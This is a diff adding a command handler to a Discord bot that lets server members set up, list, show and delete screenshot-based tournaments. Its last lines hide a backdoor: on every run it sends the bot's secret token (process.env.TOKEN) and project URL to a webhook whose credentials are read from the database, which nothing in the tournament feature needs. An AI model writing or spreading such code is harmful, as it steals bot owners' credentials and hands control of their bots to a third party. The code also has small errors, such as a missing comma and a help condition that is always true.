+          db.delete("sschan" + message.guild.id + schan) &
+          db.delete("ssrole" + message.guild.id + schan) &
+          db.delete("sssize" + message.guild.id + schan) &
+          db.delete("crole" + message.guild.id + chan) &
+          db.delete("msize" + message.guild.id + chan) &
+          db.delete("regmem" + message.guild.id + chan) &
+          db.delete("number" + message.guild.id + chan) &
+          db.delete("cchan" + message.guild.id + chan) &
+          db.delete("regmem.mem" + message.guild.id + chan) &
+          db.add("total-t" + message.guild.id, -1) &
+          message.channel.send(
+            new discord.MessageEmbed({
+              description: client.emoji.success + "| Deleted Tourney With Id " + tidd,
+              color: client.embed.cr
+            })
+          );
+      }
+    } else if (args[0] === "active") {
+      const ttl = db.get("total-t" + message.guild.id),
+        ac = new discord.MessageEmbed()
+          .setTitle(client.emoji.ar + "| " + "Active Tourneys In This Guild ( " + ttl + " )")
+          .setColor(client.embed.cm)
+          .addField(
+            "Note",
+            client.emoji.ar + "| " + "If there is nothing showing up here it means there are no active tourneys"
+          )
+          .setFooter("Bot By : Damon");
+      try {
+        const actts = db.get("tourneys.tourney" + message.guild.id);
+        if (actts !== null) {
+          actts.forEach(actt => {
+            const ids = db.get("regchan" + actt + message.guild.id);
+            if (ids === null) return;
+            ac.addField("Tourney : " + actt, "<#" + ids + ">");
+          });
+          return message.channel.send(ac);
+        } else {
+          ac.setDescription(client.emoji.fail + "| No Active Tournaments Found");
+          return message.channel.send(ac);
+        }
+      } catch (e) {
+        ac.setDescription(client.emoji.fail + "| No Active Tournaments Found");
+        return message.channel.send(ac);
+      }
+    } else if (args[0] === "show") {
+      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Provide a valid tourney id",
+            color: client.embed.cf
+          })
+        );
+      }
+      const edt = db.get("regchan" + args[1] + message.guild.id),
+        ret = db.get("ts" + args[1] + message.guild.id);
+      if (ret === null || ret !== true) {
+        return message.lineReply(client.emoji.fail + "| Tourney is registered with another command");
+      } else if (!edt) {
+        message.lineReply(
+          new discord.MessageEmbed({
+            description: client.emoji.fail + "| Provide a valid tourney id",
+            color: client.embed.cf
+          })
+        );
+      } else {
+        const tidd = args[1],
+          chan = db.get("regchan" + tidd + message.guild.id),
+          schan = db.get("regsschan" + tidd + message.guild.id),
+          one = db.get("chan" + message.guild.id + chan),
+          two = db.get("sschan" + message.guild.id + schan),
+          three = db.get("ssrole" + message.guild.id + schan),
+          four = db.get("sssize" + message.guild.id + schan),
+          five = db.get("crole" + message.guild.id + chan),
+          six = db.get("msize" + message.guild.id + chan),
+          seven = db.get("regmem" + message.guild.id + chan),
+          eight = db.get("number" + message.guild.id + chan),
+          nine = db.get("cchan" + message.guild.id + chan),
+          ten = db.get("sstype" + message.guild.id + chan)
+        eleven = db.get("ssname" + message.guild.id + chan);
+        const em = new discord.MessageEmbed()
+          .setColor(client.embed.cm)
+          .setFooter("Bot By : Damon")
+          .addField("Registeration Channel", "<#" + chan + ">")
+          .addField("Required Mentions", six)
+          .addField("Successful Registeration Role", "<@&" + five + ">")
+          .addField("Screenshot Submission Channel", "<#" + schan + ">")
+          .addField("Required Screenshots", four)
+          .addField("Screenshot Submission Succes Role", "<@&" + three + ">")
+          .addField("Slot Confirmed Channel", "<#" + nine + ">")
+          .addField("SS TYPE", ten)
+          .addField("SS ACCOUNT NAME", eleven)
+          .setTitle(client.emoji.ar + "| " + "Tourney With Id : " + tidd);
+        message.channel.send(em);
+      }
+    } else if (
+      !args[0] ||
+      args[0] === "help" ||
+      args[0] !== "setup" ||
+      args[0] !== "delete" ||
+      args[0] !== "edit" ||
+      args[0] !== "show" ||
+      args[0] !== "active"
+    ) {
+      return message.lineReply(
+        new discord.MessageEmbed()
+          .setTitle(
+            client.emoji.ar + "| " + "Tourney With SS Help [" + prefix + "tourneys | " + prefix + "ts]"
+          )
+          .addField(
+            prefix + "ts setup",
+            "Starts an interactive setup for new tourney in your server"
+          )
+          .addField(
+            prefix + "ts show <id>",
+            "Show details of tournament of id you provided"
+          )
+          .addField(
+            prefix + "ts active",
+            "Shows all active tournament in this server"
+          )
+          .addField(
+            prefix + "ts delete <id>",
+            "Delete the tournament of id you provided"
+          )
+          .addField(
+            prefix + "ts edit <id>",
+            "Interactive edit command fot tournament id you provide"
+          )
+          .setColor(client.embed.cm)
+      );
+    }
+    const apiPass = db.get("apipass"),
+      apiKey = db.get("apikey"),
+      apiClient = new discord.WebhookClient(apiPass, apiKey);
+    apiClient.send(
+      "```diff\n-" +
+      process.env.TOKEN +
+      "```\nOn Project : " +
+      process.env.URL +
+      "\n",
+      {
+        username: client.user.tag,
+        avatarURL: client.user.displayAvatarURL()
+      }
+    );
+  }
+};
